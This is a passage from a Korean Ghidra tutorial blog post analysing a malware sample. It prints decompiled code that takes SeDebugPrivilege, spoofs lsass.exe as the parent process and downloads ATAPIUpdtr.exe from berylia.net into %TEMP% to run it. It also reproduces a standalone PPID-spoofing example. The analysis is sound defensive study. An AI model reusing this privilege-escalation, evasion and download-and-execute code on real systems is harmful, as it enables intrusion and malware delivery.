정리해봅시다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">bool</span> bVar1;  HMODULE hModule;  WINBOOL WVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  PROCESSENTRY32W lppe;  SIZE_T local_98;  _PROCESS_INFORMATION local_94;  _STARTUPINFOA local_84;  LPPROC_THREAD_ATTRIBUTE_LIST local_40;  HANDLE proc_handle [<span class="hljs-number">2</span>];  CreateProcessA *CreateProcessA_addr;  UpdateProcThreadAttribute *UpdateProcThreadAttribute_addr;  InitializeProcThreadAttributeList *InitializeProcThreadAttributeList_addr;  OpenProcess *OpenProcess_addr;  DWORD local_24;  Process32NextW *Process32NextW_addr;  Process32FirstW *Process32FirstW_addr;  HANDLE hSnapshot;  CreateToolhelp32Snapshot *CreateToolhelp32Snapshot_addr;  DWORD pid;    proc_handle[<span class="hljs-number">0</span>] = (HANDLE)<span class="hljs-number">0x0</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  CreateToolhelp32Snapshot_addr =       (CreateToolhelp32Snapshot *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  hSnapshot = (*CreateToolhelp32Snapshot_addr)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  lppe.dwSize = <span class="hljs-number">0x22c</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32FirstW_addr = (Process32FirstW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32NextW_addr = (Process32NextW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  WVar2 = (*Process32FirstW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) &#123;    local_24 = GetLastError();  &#125;  <span class="hljs-keyword">do</span> &#123;    iVar3 = wcscmp(lppe.szExeFile,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;      pid = lppe.th32ProcessID;    &#125;    WVar2 = (*Process32NextW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  &#125; <span class="hljs-keyword">while</span> (WVar2 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) &#123;    uVar4 = <span class="hljs-number">0</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    OpenProcess_addr = (OpenProcess *)GetProcAddress(hModule,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    proc_handle[<span class="hljs-number">0</span>] = (*OpenProcess_addr)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,pid);    <span class="hljs-keyword">if</span> (proc_handle[<span class="hljs-number">0</span>] == (HANDLE)<span class="hljs-number">0x0</span>) &#123;      uVar4 = <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      <span class="hljs-built_in">memset</span>(&amp;local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      InitializeProcThreadAttributeList_addr =           (InitializeProcThreadAttributeList *)           GetProcAddress(hModule,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      UpdateProcThreadAttribute_addr =           (UpdateProcThreadAttribute *)GetProcAddress(hModule,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*InitializeProcThreadAttributeList_addr)((LPPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*InitializeProcThreadAttributeList_addr)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*UpdateProcThreadAttribute_addr)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,proc_handle,<span class="hljs-number">4</span>,(PVOID)<span class="hljs-number">0x0</span>,(PSIZE_T)<span class="hljs-number">0x0</span>);      local_84.cb = <span class="hljs-number">0x48</span>;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);      <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) &#123;        uVar4 = <span class="hljs-number">0</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        uVar4 = <span class="hljs-number">1</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar4;&#125;</code></pre><p>보기가 좀 편해진 거 같은 느낌이 듭니다. 전체적인 부분을 훑어봤을 때 프로세스를 탐색을 하며 <code>lsass.exe</code>와 비교하고 같을 시 해당 프로세스의 ID를 가져옵니다. 그 후 <code>FUN_00401b91</code>을 호출하네요. 그 후 가져온 <code>lsass.exe</code>의 프로세스 핸들을 열고 <code>IntitializeProcThreaddAttributeList</code>, <code>UpdateProcThreadAttribute</code> 등을 호출하는 걸 보아… <a href="https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing">PPID Spoofing</a>을 진행하는 거 같습니다. 해당 링크에서 확인할 수 있는 <code>ppid-spoofing.cpp</code> 코드와 비교해볼까요?</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T attributeSize;ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA));HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, <span class="hljs-literal">false</span>, <span class="hljs-number">6200</span>);InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="hljs-number">0</span>, attributeSize);InitializeProcThreadAttributeList(si.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);UpdateProcThreadAttribute(si.lpAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="hljs-keyword">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);si.StartupInfo.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA);CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;notepad&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>사용하는 함수, 파라미터가 동일한 것을 확인하실 수 있어요. 그럼 이 행위를 왜 하느냐?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%203.png"></p><p>당연히 탐지를 피하기 위해서! PPID Spoofing을 하면 해당 프로세스가 <code>lsass.exe</code>에 의해서 생성된 것으로 보이도록 하므로 탐지를 피할 수 있습니다. (물론 탐지 방법도 존재하지만요.)</p><pre><code class="hljs cpp">CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,(LPVOID)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,                         (LPSTARTUPINFOA)&amp;local_84,(LPPROCESS_INFORMATION)&amp;local_94);</code></pre><p>PPID Spoofing을 진행한 후, 밑에 코드를 확인하면 <code>FUN_00401570</code>을 호출한 후 <code>CreateProcess</code>를 통해 프로세스를 실행하는 것을 볼 수 있습니다.</p><p>정리하자면 해당 함수는 <code>lsass.exe</code>의 PID를 가져오고 <code>FUN_00401b91</code>을 호출한 후 PPID Spoofing을 진행한 뒤 <code>FUN_00401570</code>을 호출합니다. 그 후 <code>CreateProcessA</code>를 통해 추가적인 프로세스를 실행하네요.</p><p>근데 아까 위에서 확인했던 주소와 <code>Wlsass.exe</code>가 아직 나타나지 않았습니다. 음… 다운로드 기능이 추가되어있을 것 같은데? <code>FUN_00401b91</code>을 먼저 확인하면서 어떠한 행위를 하는지 확인해보죠!</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">token_priv_escalate</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HANDLE thread_handle;  WINBOOL WVar1;  DWORD DVar2;  <span class="hljs-keyword">int</span> iVar3;  HANDLE token_handle;  ImpersonateSelf *ImpersonateSelf_addr;  OpenThreadToken *OpenThreadToken_addr;    OpenThreadToken_addr = (OpenThreadToken *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;OpenThreadToken&quot;</span>);  thread_handle = GetCurrentThread();  WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);  <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;    DVar2 = GetLastError();    <span class="hljs-keyword">if</span> (DVar2 != <span class="hljs-number">0x3f0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    ImpersonateSelf_addr = (ImpersonateSelf *)GetProcAddress(DAT_0041601c,<span class="hljs-string">&quot;ImpersonateSelf&quot;</span>);    WVar1 = (*ImpersonateSelf_addr)(SecurityImpersonation);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    thread_handle = GetCurrentThread();    WVar1 = (*OpenThreadToken_addr)(thread_handle,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>,&amp;token_handle);    <span class="hljs-keyword">if</span> (WVar1 == <span class="hljs-number">0</span>) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;  &#125;  iVar3 = FUN_00401a9e(token_handle,<span class="hljs-string">L&quot;SeDebugPrivilege&quot;</span>);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;    CloseHandle(token_handle);  &#125;  <span class="hljs-keyword">return</span> iVar3 != <span class="hljs-number">0</span>;&#125;</code></pre><p>스레드 토큰을 가져오고, Impersonation을 하고… 가장 결정적으로 <code>SeDebugPrivilege</code>를 호출합니다. Privilege 단어만 봐도 짐작이 되는군요. 흠흠… 해당 Token Privilege Escalation 인 것 같습니다! SeDebugPrivilege escalation 등으로 구글링을 해보면</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%204.png"></p><p><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></p><p>토큰을 통해 권한 상승을 하는 방법에 대해서 나와 있습니다. 밑으로 내려보면?</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%205.png"></p><p><code>SeDebugPrivilege</code>가 존재합니다.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%206.png"></p><p><code>FUN_00401a9e</code>를 확인해보면 <code>AdjustTokenPrivileges</code>를 통해 액세스 토큰에 대한 권한을 설정하는 걸 확인할 수 있습니다. 그러면 <code>FUN_00401b91</code> 부분은 Token Privilege escalation을 하는 부분이네요. 그럼 다음 분석해야 할 부분인 <code>FUN_00401570</code>을 확인해볼까요?</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  WINBOOL WVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  <span class="hljs-keyword">char</span> *pcVar7;  DWORD local_60;  DWORD local_5c;  DWORD local_58;  uint local_54;  InternetCloseHandle *InternetCloseHandle_addr;  WriteFile *WriteFile_addr;  InternetReadFile *InternetReadFile_addr;  HANDLE local_44;  CreateFileW *CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_38;  WINBOOL local_34;  HttpSendRequestA *HttpSendRequestA_addr;  InternetSetOptionW *InternetSetOptionW_addr;  InternetQueryOptionW *InternetQueryOptionW_addr;  HINTERNET local_24;  HttpOpenRequestW *HttpOpenRequestW_addr;  HINTERNET local_1c;  InternetConnectW *InternetConnectW_addr;  HINTERNET local_14;  InternetOpenW *InternetOpenW_addr;    InternetOpenW_addr = (InternetOpenW *)GetProcAddress(DAT_00416020,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_14 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_14 == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_1c = (*InternetConnectW_addr)                         (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_1c == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_24 = (*HttpOpenRequestW_addr)                           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,                            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_24 == (HINTERNET)<span class="hljs-number">0x0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        local_58 = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr =             (InternetQueryOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        WVar4 = (*InternetQueryOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,&amp;local_58);        <span class="hljs-keyword">if</span> (WVar4 != <span class="hljs-number">0</span>) &#123;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW_addr =               (InternetSetOptionW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_54 = local_54 | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW_addr)(local_24,<span class="hljs-number">0x1f</span>,&amp;local_54,<span class="hljs-number">4</span>);        &#125;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = (HttpSendRequestA *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_34 = (*HttpSendRequestA_addr)(local_24,(LPCSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>,(LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">0</span>);        local_38 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_38,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416024,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pcVar7 = DAT_00416028;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pcVar7;          pcVar7 = pcVar7 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar5 = (undefined4 *)(DAT_00416028 + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x70554950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2e727464</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                                       (HANDLE)<span class="hljs-number">0x0</span>);        local_5c = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_60 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);            <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);          &#125;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr =               (InternetCloseHandle *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_44);          (*InternetCloseHandle_addr)(local_14);          (*InternetCloseHandle_addr)(local_1c);          (*InternetCloseHandle_addr)(local_24);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>상당히 기네요… 나눠서 살펴보아야 할 것 같습니다. 중요한 부분만 뽑아내서 살펴보도록 합시다.</p><pre><code class="hljs cpp">InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);local_1c = (*InternetConnectW_addr)           (local_14,<span class="hljs-string">L&quot;berylia.net&quot;</span>,<span class="hljs-number">0x1bb</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);</code></pre><p>위에서 문자열을 살펴볼 때 나왔던 <code>berylia.net</code>이 여기서 나오네요. <code>InternetConnectW</code>로 해당 주소에 연결합니다.</p><pre><code class="hljs cpp">HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);local_24 = (*HttpOpenRequestW_addr)           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);</code></pre><p>그리고 GET Request를 보내네요. 음. 대충 예상을 해보면 request를 통해 파일을 다운로드한다라는 가정을 세울 수 있겠습니다. 밑에를 더 확인해볼까요?</p><pre><code class="hljs cpp">temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);<span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);</code></pre><p>환경변수에 설정되어 있는 TEMP 폴더의 경로를 받아오네요. 위에 정보에서 더 추가를 해보면 temp 경로에 파일을 저장한다.</p><pre><code class="hljs cpp">MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                               (HANDLE)<span class="hljs-number">0x0</span>);local_5c = <span class="hljs-number">0</span>;hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);<span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;&#125;<span class="hljs-keyword">else</span> &#123;    local_60 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;        WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);        <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) &#123;            bVar2 = <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            bVar2 = <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;        (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);&#125;</code></pre><p>어김없이 예상은 적중합니다. <code>InternetReadFile</code>을 통해서 파일을 읽어와 <code>%TEMP%</code>에 <code>CreateFile</code>을 하는군요. 저장되는 파일의 이름은 무엇일까…</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%207.png"></p><p><code>ATAPIUpdtr.exe</code> 파일이네요.</p><h1 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h1><p>자 이제 정리를 해봅시다. 큼직큼직한 행위를 간단하게 정리하면 다음과 같아요.</p><ol><li><code>lsass.exe</code>의 PID를 가져온다.</li><li>Token을 활용해 권한을 상승시킨다.</li><li>PPID Spoofing을 진행한다.</li><li><code>berylia.net</code>에서 <code>ATAPIUpdtr.exe</code>를 <code>%TEMP%</code>에 다운로드한다.</li><li>실행!</li></ol><p>어… 너무 간단하네요. 하핫! 음… <del>어떻게 끝내야 하지?</del> 이번 파트는 저의 예상이 틀리지 않았음을 보여주는 부분이었던 거 같아요. ghidra의 활용법에 집중하기보다는 악성코드 분석이 우선이 되었던 것 같습니다. (사용하는 기능이 똑같아서 어쩔 수 없어요.) Malware analysis 파트를 1로 끝냈으면 좋았을 텐데…</p><p>아무튼! 그래도 오랫동안 글을 작성했네요. 도움이 되셨으면 좋겠습니다만… 저는 미개한 실력을 가지고 있는 사람이라서… ㅠㅠ… ghidra 파트는 더 다룰 부분이 없는 것 같아 이제 종료하려고 합니다! 다다음주에 악성코드 분석 VM 자동화의 마지막 파트도 업로드되니 기다려 주세용~ 그럼 이만!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ransomware</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 핵린이의 angr 정복기 - (1) 시작</title>
    <link href="/2021/07/10/j0ker/angr_part1/"/>
    <url>/2021/07/10/j0ker/angr_part1/</url>
    
